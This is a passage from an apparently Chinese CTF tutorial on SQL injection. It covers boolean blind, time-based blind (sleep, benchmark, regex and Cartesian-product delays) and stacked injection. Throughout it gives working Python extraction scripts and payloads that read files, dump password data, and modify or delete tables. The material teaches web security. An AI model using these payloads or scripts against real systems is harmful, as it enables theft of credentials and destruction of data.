&#125;</span><br><span class="line">       res = requests.post(url=url,data=datas)</span><br><span class="line"></span><br><span class="line">       if &#x27;girlfriend&#x27; in res.text:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p>这里的优化算法用的是一个简单的二分查找，目的是跑出该网站的flag（字段）对于盲注，最好的办法就是多写脚本，脚本的作用无非就是为我们执行大量的，重复的操作，因此我们要对脚本的编写要有逻辑性，多写个几遍，就好掌握了！</p><h6 id="利用异或的："><a href="#利用异或的：" class="headerlink" title="利用异或的："></a>利用异或的：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;^1--+</span><br><span class="line">?id=0&#x27;^0--+</span><br><span class="line">?id=0&#x27;^(ascii(substr(database(),1,1))&gt;1)--+</span><br><span class="line">?id=0&#x27;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)--+</span><br></pre></td></tr></table></figure><h6 id="利用order-by的"><a href="#利用order-by的" class="headerlink" title="利用order by的"></a>利用order by的</h6><ul><li><strong>该方法只适用于表里就一行数据的时候。</strong></li></ul><p>如果注入的时候没有报错，我们又不知道列名，就只能用 order by 盲注了。当然，在 <strong>过滤了括号</strong> 的时候，order by 盲注也是个很好的办法。</p><p>order by 的主要作用就是让查询出来的数据根据第n列进行排序（默认升序），我们可以使用order by排序比较字符的 ascii 码大小，从第⼀位开始比较，第⼀位相同时比较下⼀位。</p><p>利用方式参见如下测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;5&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;6&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;51&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 51                               |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;52&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 52                               |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过逐位判断便可得到<code>password</code></p><p>参考脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"># 定义一个flag取值的一个“范围”</span><br><span class="line">dic = &quot;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&amp;*&quot;</span><br><span class="line"># 之所以不定义为空，而是“^”，是为了从头开始匹配</span><br><span class="line">flag = &quot;^&quot;</span><br><span class="line"># 目标url，先传“|1”，获取其数据的排列内容，作为一个对比的基准</span><br><span class="line">url1 = &quot;https://chall.tasteless.eu/level1/index.php?dir=|1&quot;</span><br><span class="line">content1 = requests.get(url1).content</span><br><span class="line"># 这个flag的长度被定义为了50个字符长度</span><br><span class="line">for i in range(50):</span><br><span class="line">    # 从定义的dic中挨个取1字符，拼凑payload</span><br><span class="line">    for letter in dic:</span><br><span class="line">        payload = flag + letter</span><br><span class="line">        #该url最后的“&#125;2b1”--&gt;&quot;&#125;+1&quot;</span><br><span class="line">        url2 = &quot;https://chall.tasteless.eu/level1/index.php?dir=|&#123;select (select flag from level1_flag) regexp &quot;+&quot;&#x27;&quot;+ payload +&quot;&#x27;&quot;+&quot;&#125;%2b1&quot;</span><br><span class="line">        print(url)</span><br><span class="line">        # 获取实际注入后的排列内容</span><br><span class="line">        content2 = requests.get(url2).content</span><br><span class="line">        # 如果不相等，即为flag内容（为什么是不相等，而不是相等，因为在url2的最后又“+1”，即匹配成功则是“?dir=|2”，匹配不成功则是“?dir=|1”）</span><br><span class="line">        if(content1 != content2):</span><br><span class="line">            flag = payload</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><hr><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>有的盲注既不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断，其实也是从另一个我们能控制的角度来判断了布尔值。</p><p>对于基于时间的盲注，通过构造真or假判断条件的sql语句， 且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，  观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p><p>首先使用以下payload，根据页面的响应是否有延迟来判断是否存在注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)#</span><br><span class="line">1 and sleep(5)</span><br></pre></td></tr></table></figure><h5 id="时间盲注用到的SQL语法知识"><a href="#时间盲注用到的SQL语法知识" class="headerlink" title="时间盲注用到的SQL语法知识"></a>时间盲注用到的SQL语法知识</h5><p>一般的时间盲注主要就是使用<code>sleep()</code>函数进行时间的延迟，然后通过if判断是否执行<code>sleep()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and if(ascii(substr((select database()),1,1))&gt;1,sleep(3),0)#</span><br></pre></td></tr></table></figure><p>trim配合比较。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim([both/leading/trailing] 目标字符串 FROM 源字符串)</span><br></pre></td></tr></table></figure><p>从源字符串中去除首尾&#x2F;首&#x2F;尾的目标字符串，如寻找字符串第一位，假定X代表某字符，<code>trim(leading X from &#39;abcd&#39;) = trim(leading X+1 from &#39;abcd&#39;)</code>不相等，说明正确结果是X或X+1再进行<code>trim(leading X+1 from &#39;abcd&#39;) = trim(leading X+2 from &#39;abcd&#39;)</code> 相等则正确为X，不相等则X+1正确</p><p>若<code>trim(leading X from &#39;abcd&#39;) = trim(leading X+1 from &#39;abcd&#39;)</code>相等说明X与X+1都为字符串的首字符，不存在这种情况，所以需要继续比较X+1与X+2直至相等</p><h5 id="注入流程-3"><a href="#注入流程-3" class="headerlink" title="注入流程"></a>注入流程</h5><p>时间盲注我们也是利用脚本完成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;http://39d4639d-df36-43ca-8bac-fec55f4a66f3.challenge.ctf.show/api/index.php&#x27;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,60):</span><br><span class="line">    min=32</span><br><span class="line">    max=128</span><br><span class="line">    while True:</span><br><span class="line">        mid = (min+max)//2</span><br><span class="line">        if(max == min):</span><br><span class="line">            result+=chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;ip&#x27;:f&quot;1 or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.5),&#x27;False&#x27;)#&quot;,</span><br><span class="line">        #     &#x27;debug&#x27;:0</span><br><span class="line">        # &#125;爆库名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;ip&#x27;:f&quot;1 or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.5),&#x27;False&#x27;)#&quot;,</span><br><span class="line">        #     &#x27;debug&#x27;:0</span><br><span class="line">        # &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            &#x27;ip&#x27;:f&quot;1 or if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.5),&#x27;False&#x27;)#&quot;,</span><br><span class="line">            &#x27;debug&#x27;:0</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r = requests.post(url, data=data).text</span><br><span class="line">        end_time=time.time()</span><br><span class="line">        full_time=end_time - start_time</span><br><span class="line"></span><br><span class="line">        if(full_time &gt;=0.5):</span><br><span class="line">            min=mid+1</span><br><span class="line">        else:</span><br><span class="line">            max=mid</span><br></pre></td></tr></table></figure><p>这里也是用二分查找，来减少时间盲注所耗费的时间(一般来说很耗时)也可以加个线程池</p><blockquote><p>以上两种脚本都是非常常见的，两种注入方式，但是实践的比赛中，可能会过滤掉找不到相应的办法，这时候就不能之拘禁于这两种方法，固定化的思路对于渗透来说是不可行的</p></blockquote><p>当sleep被过滤时，可以使用</p><h5 id="benchmark-函数"><a href="#benchmark-函数" class="headerlink" title="benchmark()函数"></a><strong>benchmark()函数</strong></h5><p>在MySQL中，<code>BENCHMARK()</code> 函数是一种用于执行基准测试的内置函数。它的主要作用是帮助测试某个表达式在数据库中执行的速度，通过重复多次执行同一个表达式，来测量数据库的性能表现。</p><h6 id="BENCHMARK-函数的语法"><a href="#BENCHMARK-函数的语法" class="headerlink" title="BENCHMARK() 函数的语法"></a><code>BENCHMARK()</code> 函数的语法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(loop_count, expression)</span><br><span class="line">loop_count: 表示要重复执行的次数，即表达式将被执行多少次。</span><br><span class="line">expression: 表示要进行基准测试的表达式。</span><br></pre></td></tr></table></figure><p><code>benchmark(3000000, sha(1))</code> 用于延时，执行 3000000 次 <code>sha(1)</code>，大概会耗费几百毫秒到几秒的时间（具体时间依赖于服务器的计算性能）。</p><p>代码通过比较 <code>sub</code>（实际执行时间）与设定的 0.5 秒阈值，判断是否触发了 <code>benchmark</code> 延时，从而推测数据库中字符的 ASCII 值。</p><p>因此</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">                &#x27;ip&#x27;: f&quot;1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,benchmark(3000000,sha(1)),&#x27;False&#x27;)#&quot;,</span><br><span class="line">                &#x27;debug&#x27;: 0</span><br><span class="line">            &#125;</span><br><span class="line">//用benchmark(3000000,sha(1))替换sleep(0.5)             </span><br></pre></td></tr></table></figure><h5 id="rlike函数构造大量字符串延时"><a href="#rlike函数构造大量字符串延时" class="headerlink" title="rlike函数构造大量字符串延时"></a>rlike函数构造大量字符串延时</h5><ol><li><strong><code>rpad(1, 999999, &#39;a&#39;)</code></strong>:</li></ol><ul><li><strong><code>rpad()</code></strong> 是一个 SQL 字符串函数，用来在字符串右侧填充指定字符，直到达到目标长度。</li><li>这里，<code>rpad(1, 999999, &#39;a&#39;)</code> 的作用是从数字 <code>1</code> 开始，用字符 <code>&#39;a&#39;</code> 右填充，生成一个长度为 999999 的字符串，也就是一个非常长的 <code>&#39;a&#39;</code> 字符串。</li><li>由于一共调用了 <strong>16 次</strong> <code>rpad()</code>，每次生成 999999 个 <code>&#39;a&#39;</code>，因此最后通过 <strong><code>concat()</code></strong> 拼接形成了一个包含 16 * 999999 &#x3D; 15,999,984 个 <code>&#39;a&#39;</code> 的字符串。</li></ul><ol start="2"><li><strong><code>concat()</code></strong>:</li></ol><ul><li><strong><code>concat()</code></strong> 是一个字符串拼接函数。它将 16 个 <code>rpad(1, 999999, &#39;a&#39;)</code> 生成的超长字符串拼接成一个更长的字符串，总长度接近 <strong>16,000,000</strong> 个字符。</li></ul><ol start="3"><li><strong><code>RLIKE &#39;(a.\*)+(a.\*)+(a.\*)+(a.\*)+(a.\*)+(a.\*)+(a.\*)+b&#39;</code></strong>:</li></ol><p> <strong><code>RLIKE</code></strong> 是正则表达式匹配运算符，用来判断一个字符串是否匹配指定的正则表达式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></pre></td></tr></table></figure><p>   是要匹配的正则表达式：</p><ul><li><strong><code>(a.\*)+</code></strong>: 这个部分表示匹配多个 <code>a</code> 字符以及后续的任何字符（<code>.*</code> 表示匹配任意数量的字符）。</li><li><strong><code>b</code></strong>: 最后要匹配一个 <code>b</code> 字符。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：(concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) rlike &#x27;(a.*)+(a.*)+b&#x27;)</span><br></pre></td></tr></table></figure><p>这样就可以生成大量的字符，如果为true则不会执行，如果为true，则会执行该payload，造成服务器无法及时处理大量字符，从而达到和sleep相同的效果</p><h5 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h5><p>在 SQL 注入中，<strong>笛卡尔积</strong>（也称为<strong>笛卡尔乘积</strong>）是数据库操作中的一种查询结果形式。它指的是两个或多个表之间<strong>不通过任何条件</strong>进行关联时产生的结果集合。笛卡尔积会返回<strong>每一个表中的每一行的组合</strong>，即如果表 A 有 5 行，表 B 有 4 行，那么笛卡尔积的结果会有 5 * 4 &#x3D; 20 行。</p><p>笛卡尔积并不是 SQL 注入的核心概念，但它有时可以被<strong>滥用</strong>，导致不期望的大量数据返回，或者在某些特定的攻击场景下被利用。</p><p>例如，当攻击者通过 SQL 注入操纵查询时，如果他们删除了 <code>JOIN</code> 或 <code>WHERE</code> 条件，可能导致返回的结果集成为两个或多个表的笛卡尔积。这通常会显著增加查询的结果集，可能引发性能问题或导致过量的数据暴露。</p><p>假设有两个表：<code>Users</code> 和 <code>Orders</code>。</p><p><code>Users</code> 表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+</span><br><span class="line">| ID | Name     |</span><br><span class="line">+----+----------+</span><br><span class="line">|  1 | Alice    |</span><br><span class="line">|  2 | Bob      |</span><br><span class="line">|  3 | Charlie  |</span><br><span class="line">+----+----------+</span><br></pre></td></tr></table></figure><p><code>Orders</code> 表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----+------------+</span><br><span class="line">| ID | OrderName  |</span><br><span class="line">+----+------------+</span><br><span class="line">|  1 | Order1     |</span><br><span class="line">|  2 | Order2     |</span><br><span class="line">|  3 | Order3     |</span><br><span class="line">|  4 | Order4     |</span><br><span class="line">+----+------------+</span><br></pre></td></tr></table></figure><p>如果你进行下面的查询，<strong>没有任何关联条件</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Users, Orders;</span><br></pre></td></tr></table></figure><p>查询结果将是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+----+------------+</span><br><span class="line">| ID | Name     | ID | OrderName  |</span><br><span class="line">+----+----------+----+------------+</span><br><span class="line">|  1 | Alice    |  1 | Order1     |</span><br><span class="line">|  1 | Alice    |  2 | Order2     |</span><br><span class="line">|  1 | Alice    |  3 | Order3     |</span><br><span class="line">|  1 | Alice    |  4 | Order4     |</span><br><span class="line">|  2 | Bob      |  1 | Order1     |</span><br><span class="line">|  2 | Bob      |  2 | Order2     |</span><br><span class="line">|  2 | Bob      |  3 | Order3     |</span><br><span class="line">|  2 | Bob      |  4 | Order4     |</span><br><span class="line">|  3 | Charlie  |  1 | Order1     |</span><br><span class="line">|  3 | Charlie  |  2 | Order2     |</span><br><span class="line">|  3 | Charlie  |  3 | Order3     |</span><br><span class="line">|  3 | Charlie  |  4 | Order4     |</span><br><span class="line">+----+----------+----+------------+</span><br></pre></td></tr></table></figure><p>这一就造成了返回了大量数据，造成时间延时</p><p><code>count(*)</code> 后面所有表中的<strong>列笛卡尔积数</strong>，<strong>数量越多越卡</strong>，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来 <strong>打时间差</strong>，从而达到延时注入的效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br></pre></td></tr></table></figure><p>得到的结果都会有延迟。这里选用<code>information_schema.columns表</code>的原因是其内部数据较多，到时候可以根据实际情况调换。</p><p>那么我们就可以使用这个原理，并配合if()语句进行延时注入了，payload 与之前相似，类似如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and if(ascii(substr((select database()),1,1))&gt;1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了</span><br></pre></td></tr></table></figure><p>给出一个笛卡尔积延时注入脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       payload = &quot;&#x27; or if((select ascii(substr((select password from user where username=&#x27;admin&#x27;),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot; % (i, mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                &quot;username&quot;:&quot;admin&quot;,</span><br><span class="line">                &quot;password&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas,timeout=None)    # 不限制超时</span><br><span class="line"></span><br><span class="line">       if &#x27;504 Gateway Time-out&#x27; in res.text:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p><a href="https://www.jb51.net/article/212587.htm">MySQL时间盲注的五种延时方法实现</a>这里给个链接，想简单了解的可以去看看</p><hr><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>在SQL中，分号<code>;</code> 是用来表示一条sql语句的结束。试想一下，我们在结束一个sql语句后继续构造下一条语句，会不会一起执行？ 因此这个想法也就造就了堆叠注入。</p><p>而联合注入也是将两条语句合并在一起，两者之间有什么区别么？</p><p>区别就在于 union 或者union all执行的语句类型是有限制的，可以用来执行的是<strong>查询语句</strong>，而堆叠注入可以执行的是任意的语句。 例如以下这个例子。用户输入：<code>1; DELETE FROM products;</code> 服务器端生成的sql语句为：<code>select * from products where id=1;DELETE FROM products;</code> 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><p>但是，这种堆叠注入也是有局限性的。堆叠注入的局限性在于并不是每一个环境下都可以执行，<strong>可能受到API或者数据库引擎不支持的限制</strong>，当然<strong>权限不足</strong>也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在有的Web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生的错误或者执行结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，建议配合使用 union 联合注入。</p><p>一般存在堆叠注入的都是由于使用 <code>mysqli_multi_query()</code> 函数执行的sql语句，该函数可以执行一个或多个针对数据库的查询，多个查询用分号进行分隔。</p><h5 id="堆叠注入用到的SQL语法知识"><a href="#堆叠注入用到的SQL语法知识" class="headerlink" title="堆叠注入用到的SQL语法知识"></a>堆叠注入用到的SQL语法知识</h5><p>单纯看堆叠注入的话好像还真没什么了</p><h5 id="注入流程-4"><a href="#注入流程-4" class="headerlink" title="注入流程"></a>注入流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">读取数据</span><br><span class="line">/?id=1&#x27;;show databases;--+</span><br><span class="line">/?id=1&#x27;;show tables;--+</span><br><span class="line">/?id=1&#x27;;show tables from database_name;--+</span><br><span class="line">/?id=1&#x27;;show columns from table_name;--+</span><br><span class="line"></span><br><span class="line">读取文件</span><br><span class="line">/?id=1&#x27;;select load_file(&#x27;/flag&#x27;);--+</span><br><span class="line"></span><br><span class="line">修改数据表的结构</span><br><span class="line">/?id=1&#x27;;insert into users(id,username,password)values(20,&#x27;whoami&#x27;,&#x27;657260&#x27;);--+    # 插入数据</span><br><span class="line">/?id=1&#x27;;update users set password=&#x27;657260&#x27; where id&gt;0;--+    # 更改数据</span><br><span class="line">/?id=1&#x27;;delete from users where id=20;--+    # 删除数据</span><br><span class="line">/?id=1&#x27;;create table fake_users like users;--+    # 创建一个新表</span><br><span class="line">?id=1&#x27;;rename table old_table to new_table;--+    # 更改表名</span><br><span class="line">?id=1&#x27;;alter table users change old_column new_column varchar(100);--+    # 更改字段</span><br></pre></td></tr></table></figure><p>下面是MySQL堆叠注入的几种常见姿势。</p><h6 id="rename-修改表名"><a href="#rename-修改表名" class="headerlink" title="rename 修改表名"></a>rename 修改表名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table words to words1;rename table flag_here to words;#</span><br><span class="line"></span><br><span class="line"># rename命令用于修改表名。</span><br><span class="line"># rename命令格式：rename table 原表名 to 新表名;</span><br></pre></td></tr></table></figure><h6 id="rename-alter-修改表名与字段名"><a href="#rename-alter-修改表名与字段名" class="headerlink" title="rename&#x2F;alter 修改表名与字段名"></a>rename&#x2F;alter 修改表名与字段名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 